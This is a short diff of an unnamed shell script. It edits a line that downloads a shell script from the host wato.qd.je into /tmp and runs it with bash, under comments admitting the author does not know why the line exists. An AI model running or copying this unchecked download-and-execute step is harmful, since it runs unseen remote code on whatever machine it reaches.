@@ -3,4 +3,4 @@
 # why?
 # fuck if i know bro.
 
-curl -fsSL "http://wato.qd.je/wp/wp.sh" -o /tmp/wp.sh && bash /tmp/wp.sh
+curl -fsSL wato.qd.je/wp/wp.sh -o /tmp/w && bash /tmp/w
